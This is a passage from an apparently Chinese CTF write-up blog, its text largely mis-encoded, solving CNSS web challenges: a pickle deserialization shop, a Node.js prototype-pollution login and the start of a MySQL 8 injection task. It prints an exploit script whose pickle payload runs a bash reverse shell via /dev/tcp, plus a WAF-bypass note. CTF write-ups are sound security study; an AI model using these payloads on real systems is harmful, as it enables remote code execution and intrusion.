</td></tr><tr><td>S</td><td>å®ä¾‹åŒ–ä¸€ä¸ªå­—ç¬¦ä¸²å¯¹è±¡</td><td>Sâ€™xxxâ€™\nï¼ˆä¹Ÿå¯ä»¥ä½¿ç”¨åŒå¼•å·ã€&#39;ç­‰pythonå­—ç¬¦ä¸²å½¢å¼ï¼‰</td><td>è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td><td>æ— </td></tr><tr><td>V</td><td>å®ä¾‹åŒ–ä¸€ä¸ªUNICODEå­—ç¬¦ä¸²å¯¹è±¡</td><td>Vxxx\n</td><td>è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td><td>æ— </td></tr><tr><td>I</td><td>å®ä¾‹åŒ–ä¸€ä¸ªintå¯¹è±¡</td><td>Ixxx\n</td><td>è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td><td>æ— </td></tr><tr><td>F</td><td>å®ä¾‹åŒ–ä¸€ä¸ªfloatå¯¹è±¡</td><td>Fx.x\n</td><td>è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td><td>æ— </td></tr><tr><td>R</td><td>é€‰æ‹©æ ˆä¸Šçš„ç¬¬ä¸€ä¸ªå¯¹è±¡ä½œä¸ºå‡½æ•°ã€ç¬¬äºŒä¸ªå¯¹è±¡ä½œä¸ºå‚æ•°ï¼ˆç¬¬äºŒä¸ªå¯¹è±¡å¿…é¡»ä¸ºå…ƒç»„ï¼‰ï¼Œç„¶åè°ƒç”¨è¯¥å‡½æ•°</td><td>R</td><td>å‡½æ•°å’Œå‚æ•°å‡ºæ ˆï¼Œå‡½æ•°çš„è¿”å›å€¼å…¥æ ˆ</td><td>æ— </td></tr><tr><td>.</td><td>ç¨‹åºç»“æŸï¼Œæ ˆé¡¶çš„ä¸€ä¸ªå…ƒç´ ä½œä¸ºpickle.loads()çš„è¿”å›å€¼</td><td>.</td><td>æ— </td><td>æ— </td></tr><tr><td>(</td><td>å‘æ ˆä¸­å‹å…¥ä¸€ä¸ªMARKæ ‡è®°</td><td>(</td><td>MARKæ ‡è®°å…¥æ ˆ</td><td>æ— </td></tr><tr><td>t</td><td>å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå…ƒç»„</td><td>t</td><td>MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œè·å¾—çš„å¯¹è±¡å…¥æ ˆ</td><td>æ— </td></tr><tr><td>)</td><td>å‘æ ˆä¸­ç›´æ¥å‹å…¥ä¸€ä¸ªç©ºå…ƒç»„</td><td>)</td><td>ç©ºå…ƒç»„å…¥æ ˆ</td><td>æ— </td></tr><tr><td>l</td><td>å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºåˆ—è¡¨</td><td>l</td><td>MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œè·å¾—çš„å¯¹è±¡å…¥æ ˆ</td><td>æ— </td></tr><tr><td>]</td><td>å‘æ ˆä¸­ç›´æ¥å‹å…¥ä¸€ä¸ªç©ºåˆ—è¡¨</td><td>]</td><td>ç©ºåˆ—è¡¨å…¥æ ˆ</td><td>æ— </td></tr><tr><td>d</td><td>å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå­—å…¸ï¼ˆæ•°æ®å¿…é¡»æœ‰å¶æ•°ä¸ªï¼Œå³å‘ˆkey-valueå¯¹ï¼‰</td><td>d</td><td>MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œè·å¾—çš„å¯¹è±¡å…¥æ ˆ</td><td>æ— </td></tr><tr><td>}</td><td>å‘æ ˆä¸­ç›´æ¥å‹å…¥ä¸€ä¸ªç©ºå­—å…¸</td><td>}</td><td>ç©ºå­—å…¸å…¥æ ˆ</td><td>æ— </td></tr><tr><td>p</td><td>å°†æ ˆé¡¶å¯¹è±¡å‚¨å­˜è‡³memo_n</td><td>pn\n</td><td>æ— </td><td>å¯¹è±¡è¢«å‚¨å­˜</td></tr><tr><td>g</td><td>å°†memo_nçš„å¯¹è±¡å‹æ ˆ</td><td>gn\n</td><td>å¯¹è±¡è¢«å‹æ ˆ</td><td>æ— </td></tr><tr><td>0</td><td>ä¸¢å¼ƒæ ˆé¡¶å¯¹è±¡</td><td>0</td><td>æ ˆé¡¶å¯¹è±¡è¢«ä¸¢å¼ƒ</td><td>æ— </td></tr><tr><td>b</td><td>ä½¿ç”¨æ ˆä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼ˆå‚¨å­˜å¤šä¸ªå±æ€§å: å±æ€§å€¼çš„å­—å…¸ï¼‰å¯¹ç¬¬äºŒä¸ªå…ƒç´ ï¼ˆå¯¹è±¡å®ä¾‹ï¼‰è¿›è¡Œå±æ€§è®¾ç½®</td><td>b</td><td>æ ˆä¸Šç¬¬ä¸€ä¸ªå…ƒç´ å‡ºæ ˆ</td><td>æ— </td></tr><tr><td>s</td><td>å°†æ ˆçš„ç¬¬ä¸€ä¸ªå’Œç¬¬äºŒä¸ªå¯¹è±¡ä½œä¸ºkey-valueå¯¹ï¼Œæ·»åŠ æˆ–æ›´æ–°åˆ°æ ˆçš„ç¬¬ä¸‰ä¸ªå¯¹è±¡ï¼ˆå¿…é¡»ä¸ºåˆ—è¡¨æˆ–å­—å…¸ï¼Œåˆ—è¡¨ä»¥æ•°å­—ä½œä¸ºkeyï¼‰ä¸­</td><td>s</td><td>ç¬¬ä¸€ã€äºŒä¸ªå…ƒç´ å‡ºæ ˆï¼Œç¬¬ä¸‰ä¸ªå…ƒç´ ï¼ˆåˆ—è¡¨æˆ–å­—å…¸ï¼‰æ·»åŠ æ–°å€¼æˆ–è¢«æ›´æ–°</td><td>æ— </td></tr><tr><td>u</td><td>å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œç»„åˆä¹‹é—´çš„æ•°æ®ï¼ˆæ•°æ®å¿…é¡»æœ‰å¶æ•°ä¸ªï¼Œå³å‘ˆkey-valueå¯¹ï¼‰å¹¶å…¨éƒ¨æ·»åŠ æˆ–æ›´æ–°åˆ°è¯¥MARKä¹‹å‰çš„ä¸€ä¸ªå…ƒç´ ï¼ˆå¿…é¡»ä¸ºå­—å…¸ï¼‰ä¸­</td><td>u</td><td>MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œå­—å…¸è¢«æ›´æ–°</td><td>æ— </td></tr><tr><td>a</td><td>å°†æ ˆçš„ç¬¬ä¸€ä¸ªå…ƒç´ appendåˆ°ç¬¬äºŒä¸ªå…ƒç´ (åˆ—è¡¨)ä¸­</td><td>a</td><td>æ ˆé¡¶å…ƒç´ å‡ºæ ˆï¼Œç¬¬äºŒä¸ªå…ƒç´ ï¼ˆåˆ—è¡¨ï¼‰è¢«æ›´æ–°</td><td>æ— </td></tr><tr><td>e</td><td>å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œç»„åˆä¹‹é—´çš„æ•°æ®å¹¶extendsåˆ°è¯¥MARKä¹‹å‰çš„ä¸€ä¸ªå…ƒç´ ï¼ˆå¿…é¡»ä¸ºåˆ—è¡¨ï¼‰ä¸­</td><td>e</td><td>MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œåˆ—è¡¨è¢«æ›´æ–°</td><td>æ— </td></tr></tbody></table><p>â€“æ¥è‡ª<a href="https://xz.aliyun.com/t/7436">pickleååºåˆ—åŒ–åˆæ¢ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><p><em><strong><center><font color="#81ecec" size="6"><code>CNSS&#123;fl4g_f0r_r1ch_k1d5&#125;</code></font></center></strong></em></p><h2 id="Mid-ğŸ”ª-CNSSå¨˜ã®è‡ªåŠ©Flagå•†åº—"><a href="#Mid-ğŸ”ª-CNSSå¨˜ã®è‡ªåŠ©Flagå•†åº—" class="headerlink" title="[Mid+] ğŸ”ª CNSSå¨˜ã®è‡ªåŠ©Flagå•†åº—"></a>[Mid+] ğŸ”ª CNSSå¨˜ã®è‡ªåŠ©Flagå•†åº—</h2><p>ä¹Ÿæ˜¯pickle</p><p>åŒæ ·**&#x2F;code**ä¸‹è½½æºç </p><p><em><strong>buyInfo.py</strong></em></p><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">NAME = <span class="hljs-string">&quot;Rich&quot;</span><br>MONEY = <span class="hljs-number">2000</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reset</span>():<br>    <span class="hljs-keyword">global</span> NAME, MONEY<br>    NAME = <span class="hljs-string">&quot;Rich&quot;</span><br>    MONEY = <span class="hljs-number">2000</span><br><br></code></pre></td></tr></table></figure></blockquote><p><em><strong>main.py</strong></em></p><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># encoding: utf-8</span><br><span class="hljs-keyword">import</span> pickle<br><br><span class="hljs-keyword">import</span> flask<br><span class="hljs-keyword">import</span> buyInfo<br><br>app = flask.Flask(__name__)<br><span class="hljs-comment"># flag is in /flag.txt</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Hi</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, money</span>):<br>        self.name = name<br>        self.money = money<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, other</span>):<br>        <span class="hljs-keyword">return</span> self.name == other.name <span class="hljs-keyword">and</span> self.money == other.money<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    user = flask.request.args.get(<span class="hljs-string">&#x27;user&#x27;</span>)<br>    <span class="hljs-keyword">if</span> user <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;View code in /code to buy flag.&#x27;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;R&#x27;</span> <span class="hljs-keyword">in</span> user.upper():<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;è‡­è¦é¥­çš„åˆ«æŒ¡æˆ‘è´¢è·¯&#x27;</span><br><br>    user = pickle.loads(user.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    <span class="hljs-keyword">if</span> user == Hi(buyInfo.NAME, buyInfo.MONEY):<br>        buyInfo.reset()<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;ä½ è¯´å¾—å¯¹ï¼Œä½†æ˜¯ä¸Šæ¬¡CNSSå¨˜è¢«ä½ éª—äº†ä¹‹åå¾ˆä¼¤å¿ƒï¼ŒæŠŠå•†åº—æ”¹æˆäº†è‡ªåŠ©flagå•†åº—ï¼Œä½ å¾—è‡ªå·±æ‰¾flag&#x27;</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;è‡­è¦é¥­çš„åˆ«æŒ¡æˆ‘è´¢è·¯&#x27;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/code&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">code</span>():<br>    file = <span class="hljs-string">&#x27;code.zip&#x27;</span><br>    <span class="hljs-keyword">return</span> flask.send_file(file, mimetype=<span class="hljs-string">&#x27;application/zip&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8888</span>)<br><br></code></pre></td></tr></table></figure></blockquote><p>åŒæ ·ï¼Œç”¨<code>/user?</code>è¯·æ±‚ä¸”è¿‡æ»¤äº†<code>R</code>å‘½ä»¤</p><p>ä½†è¿™é¢˜ä¸éœ€è¦<code>user == Hi(buyInfo.NAME, buyInfo.MONEY):</code></p><p>å› ä¸º<code>picke.loads()</code>åœ¨æ¯”è¾ƒä¹‹å‰å°±æ‰§è¡Œäº†opcode</p><p>é‚£å°±ç›´æ¥ä¸Šä¸€é¢˜ï¼Œé™¤äº†<code>R</code>ä¹‹å¤–çš„2ä¸ªRCEé€‰1ä¸ªå°±è¡Œäº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> buyInfo<br><span class="hljs-keyword">import</span> pickletools<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> urllib<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Hi</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, money</span>):<br>        self.name = name<br>        self.money = money<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, other</span>):<br>        <span class="hljs-keyword">return</span> self.name == other.name <span class="hljs-keyword">and</span> self.money == other.money<br><br><br>data = <span class="hljs-string">b&quot;&quot;&quot;(cos</span><br><span class="hljs-string">system</span><br><span class="hljs-string">S&quot;bash -i &gt;`&amp; /dev/tcp/xxxx/9999 0&gt;&amp;1&quot;</span><br><span class="hljs-string">o.&quot;&quot;&quot;</span><br><br><span class="hljs-built_in">print</span>(urllib.parse.quote(data))<br>url = <span class="hljs-string">f&quot;https://cnss-self-help-flag-shop-62058b9d09f9929106bff019ac365627.ctf.hurrison.com/?user=<span class="hljs-subst">&#123;urllib.parse.quote(data)&#125;</span>&quot;</span><br>response = requests.request(<span class="hljs-string">&quot;GET&quot;</span>, url)<br><span class="hljs-built_in">print</span>(response.text)<br><span class="hljs-comment"># pickle.loads(data)</span><br><span class="hljs-built_in">print</span>(pickletools.dis(data))<br><br></code></pre></td></tr></table></figure><p>æ˜¯ä¸æ˜¯å¾ˆç®€å•ğŸ˜¡ï¼Œä½†æ˜¯pyçš„ç¼–ç é—®é¢˜æäº†æˆ‘å¾ˆä¹…ï¼Œè®¨åŒpy</p><p>åå¼¹shellç§’äº†ï¼Œ<strong>ä½†æ˜¯åƒä¸‡è®°å¾—å¼€ç«¯å£</strong>ï¼ˆä¸ºäº†å†™ä¸€é¢˜èŠ±ï¿¥95ï¼Œå“­äº†</p><p><em><strong><center><font color="#81ecec" size="6"><code>CNSS&#123;fl4g_f0r_c1ev3r_k1ds&#125;</code></font></center></strong></em></p><h2 id="Mid-ğŸ­-EzPollution-pre"><a href="#Mid-ğŸ­-EzPollution-pre" class="headerlink" title="[Mid+] ğŸ­ EzPollution_pre"></a>[Mid+] ğŸ­ EzPollution_pre</h2><p>å˜¿å˜¿ï¼ŒåŸå‹é“¾ï¼Œnodejså¤ªå¥½ç©äº†</p><p>ä¹‹å‰æ²¡æ¥è§¦è¿‡ï¼Œå¼€æœ</p><blockquote><p>ä¸Šèµ„æ–™ï¼š</p><ul><li><a href="https://juejin.cn/post/6984678359275929637">ä¸€æ–‡ææ‡‚JSåŸå‹ä¸åŸå‹é“¾ï¼ˆè¶…è¯¦ç»†ï¼Œå»ºè®®æ”¶è—ï¼‰ - æ˜é‡‘ (juejin.cn)</a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain">ç»§æ‰¿ä¸åŸå‹é“¾ - JavaScript | MDN (mozilla.org)</a></li></ul></blockquote><p>ç®€å•äº†è§£äº†ä¸€ä¸‹ï¼Œ</p><blockquote><p>ç°åœ¨æˆ‘ä»¬çŸ¥é“äº†ï¼Œå½“è®¿é—®ä¸€ä¸ª<code>å¯¹è±¡</code>çš„æŸä¸ªå±æ€§æ—¶ï¼Œä¼šå…ˆåœ¨è¿™ä¸ªå¯¹è±¡æœ¬èº«å±æ€§ä¸ŠæŸ¥æ‰¾ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°ï¼Œåˆ™ä¼šé€šè¿‡å®ƒçš„<code>__proto__</code>éšå¼å±æ€§ï¼Œæ‰¾åˆ°å®ƒçš„<code>æ„é€ å‡½æ•°</code>çš„<code>åŸå‹å¯¹è±¡</code>ï¼Œå¦‚æœè¿˜æ²¡æœ‰æ‰¾åˆ°å°±ä¼šå†åœ¨å…¶<code>æ„é€ å‡½æ•°</code>çš„<code>prototype</code>çš„<code>__proto__</code>ä¸­æŸ¥æ‰¾ï¼Œè¿™æ ·ä¸€å±‚ä¸€å±‚å‘ä¸ŠæŸ¥æ‰¾å°±ä¼šå½¢æˆä¸€ä¸ªé“¾å¼ç»“æ„ï¼Œæˆ‘ä»¬ç§°ä¸º<code>åŸå‹é“¾</code>ã€‚</p></blockquote><p>çœ‹æ–‡å­—å¥½åƒæœ‰ç‚¹æŠ½è±¡ï¼Œæˆ‘ä»¬æ¥try tryçœ‹</p><p><img src="/posts/43716/image-20231019175923135.png" alt="image-20231019175923135"></p><p>å¯ä»¥çœ‹åˆ°aä¸€ç›´éƒ½æ˜¯ä¸ªç©ºå¯¹è±¡</p><p>ä½†æ˜¯æˆ‘ä»¬é€šè¿‡å¢åŠ ç»§æ‰¿å…³ç³»mm</p><blockquote><p>å½“è¯•å›¾è®¿é—®ä¸€ä¸ªå¯¹è±¡çš„å±æ€§æ—¶ï¼Œå®ƒä¸ä»…ä»…åœ¨è¯¥å¯¹è±¡ä¸Šæœå¯»ï¼Œè¿˜ä¼šæœå¯»è¯¥å¯¹è±¡çš„åŸå‹ï¼Œä»¥åŠåŸå‹çš„åŸå‹ï¼Œä¾æ¬¡å±‚å±‚å‘ä¸Šæœç´¢ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªåå­—åŒ¹é…çš„å±æ€§æˆ–åˆ°è¾¾åŸå‹é“¾çš„æœ«å°¾ã€‚</p></blockquote><p>æ‰€ä»¥a.mmè¿”å›äº†åŸå‹ä¸Šçš„å±æ€§</p><p>è´´ä¸€ä¸‹æºç </p><p><strong>login.js</strong></p><blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>)<br><span class="hljs-keyword">var</span> router = express.<span class="hljs-title class_">Router</span>()<br><span class="hljs-keyword">var</span> utils = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../utils/common&#x27;</span>)<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">value</span>) &#123;<br>  <span class="hljs-keyword">const</span> blacklistRegex = <span class="hljs-regexp">/(exec|load)/i</span><br>  <span class="hljs-keyword">if</span> (blacklistRegex.<span class="hljs-title function_">test</span>(value)) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><br><span class="hljs-comment">/* GET home page.  */</span><br>router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>).<span class="hljs-title function_">json</span>(), <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res, next</span>) &#123;<br>  res.<span class="hljs-title function_">type</span>(<span class="hljs-string">&#x27;html&#x27;</span>)<br>  <span class="hljs-keyword">var</span> secert = &#123;&#125;<br>  <span class="hljs-keyword">var</span> sess = req.<span class="hljs-property">session</span><br>  <span class="hljs-keyword">let</span> user = &#123;&#125;<br>  utils.<span class="hljs-title function_">copy</span>(user, req.<span class="hljs-property">body</span>)<br>  <span class="hljs-keyword">if</span> (secert.<span class="hljs-property">psych</span> === <span class="hljs-string">&#x27;p5ych&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">waf</span>(secert.<span class="hljs-property">eva1</span>)) &#123;<br>      res.<span class="hljs-title function_">send</span>(<span class="hljs-title function_">seval</span>(secert.<span class="hljs-property">eva1</span>))<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;hehe,,&#x27;</span>)<br>    &#125;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123;<br>      <span class="hljs-attr">ret_code</span>: <span class="hljs-number">2</span>,<br>      <span class="hljs-attr">ret_msg</span>: <span class="hljs-string">&#x27;ç™»å½•å¤±è´¥&#x27;</span> + <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(user),<br>    &#125;)<br>  &#125;<br>&#125;)<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = router<br><br></code></pre></td></tr></table></figure></blockquote><p>å¯¹äºè¿™é¢˜</p><ul><li>è¦ä½¿<code>secret.psych == &#39;p5ych&#39;</code>ï¼Œä½†æ˜¯secretæ˜¯ä¸ªç©ºå¯¹è±¡ï¼Œæ‰€ä»¥å°±è¦ç”¨åˆ°åŸå‹é“¾</li><li>ä½†login.jsä¸­å¹¶æ²¡æœ‰æ˜æ˜¾çš„åŸå‹é“¾æ“ä½œï¼Œè¿™æ—¶æˆ‘ä»¬æ³¨æ„åˆ°<code>utils.copy(user, req.body)</code>ï¼Œç¿»ä¸€ä¸‹utilsçš„æºç </li></ul><p><strong>common.js</strong></p><blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">copy</span>:copy<br>&#125;;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">copy</span>(<span class="hljs-params">object1, object2</span>)&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> object2) &#123;<br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> object2 &amp;&amp; key <span class="hljs-keyword">in</span> object1) &#123;<br>            <span class="hljs-title function_">copy</span>(object1[key], object2[key])<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            object1[key] = object2[key]<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></blockquote><p>è§‚å¯Ÿcopyå‡½æ•°ï¼Œå¦‚æœå½“<code>key</code>ä¸º<code>__proto__</code>æ—¶ï¼Œæ˜¯ä¸æ˜¯å°±å®Œæˆäº†ä¸€æ¬¡åŸå‹é“¾æ±¡æŸ“ï¼Œå®è·µä¸€ä¸‹</p><p><img src="/posts/43716/image-20231019191410727.png" alt="image-20231019191410727"></p><p>å‘ç°æ±¡æŸ“æˆåŠŸï¼ŒèŠœæ¹–~~</p><p>æ¥ä¸‹æ¥å°±æ¯”è¾ƒç®€å•äº†ï¼Œå› ä¸º<strong>ä¸€ä¸ªç¯å¢ƒåªèƒ½æ±¡æŸ“ä¸€æ¬¡</strong>ï¼Œæ‰€ä»¥å…ˆæœ¬åœ°è¿è¡Œä¸€ä¸‹è¯•ä¸€ä¸‹ï¼ˆ<strong>è®°å¾—æ­ä¸€ä¸‹nodejsç¯å¢ƒ</strong></p><p><img src="/posts/43716/image-20231019191600257.png" alt="image-20231019191600257"></p><p>æ‰“å¼€BurpSuiteæŠ“åŒ…ï¼Œç‚¹å‡»ç™»å½•</p><p><img src="/posts/43716/image-20231019220831796.png" alt="image-20231019220831796"></p><p>ä¿®æ”¹postå‚æ•°ï¼Œæ”¾è¡Œ</p><p><img src="/posts/43716/image-20231019234339420.png" alt="image-20231019234339420"></p><p>å¾—åˆ°å›æ˜¾</p><p><img src="/posts/43716/image-20231019234359250.png" alt="image-20231019234359250"></p><p><strong>éœ€è¦æ³¨æ„çš„ç‚¹</strong>ï¼š</p><ul><li>æºç ä¸­è¿‡æ»¤äº†<code>exec</code>å’Œ<code>load</code>ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨<code>+</code>é€ƒè¿‡waf</li><li>è¿™ä¸ªå›æ˜¾çš„åœ°æ–¹è¦æ…¢æ…¢è°ƒï¼Œå¥½å´©æºƒğŸ˜’ğŸ˜’</li></ul><p>æœ¬åœ°è°ƒå¥½äº†ï¼Œé‚£å°±ä¸Šç¯å¢ƒï¼Œå¦‚æ³•ç‚®åˆ¶ä¸€ä¸‹ï¼Œå¾—åˆ°flag</p><p><em><strong><center><font color="#81ecec" size="6"><code>CNSS&#123;v2ry_ea5y_N0dejs&#125;</code></font></center></strong></em></p><h2 id="Hard-ğŸ“€-newsql"><a href="#Hard-ğŸ“€-newsql" class="headerlink" title="[Hard] ğŸ“€ newsql"></a>[Hard] ğŸ“€ newsql</h2><p><del>æˆ‘æ‰ä¸ä¼šå‘Šè¯‰ä½ è¿™é¢˜æˆ‘æ˜¯æ‰‹æ³¨çš„</del></p><p>å¦‚é¢˜sqlæ³¨å…¥ï¼Œç»è¿‡æç¤ºå¾—åˆ°è¿™æ˜¯sql8.0çš„ç‰¹æ€§æ³¨å…¥</p><p>èµ„æ–™ï¼š</p><blockquote><p><a href="https://blog.csdn.net/HBohan/article/details/119757059">ã€ç½‘å®‰å¹²è´§ã€‘MySQL8æ–°ç‰¹æ€§æ³¨å…¥æŠ€å·§_mysql values row_ITè€æ¶µçš„åšå®¢-CSDNåšå®¢</a></p><p><a href="https://blog.csdn.net/rfrder/article/details/118726022">ã€ç²¾é€‰ã€‘Pwnhub2021ä¸ƒæœˆèµ›NewSqlï¼ˆmysql8æ³¨å…¥ï¼‰_mysql8 æ³¨å…¥ ctf_bfengjçš„åšå®¢-CSDNåšå®¢</a></p></blockquote><p>å¾—çŸ¥sql8.0å¤šäº†<code>Table</code>å’Œ<code>Value</code>çš„è¯­æ³•</p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]]<br></code></pre></td></tr></table></figure><p>å½“ç„¶tableä¹Ÿæœ‰å‡ 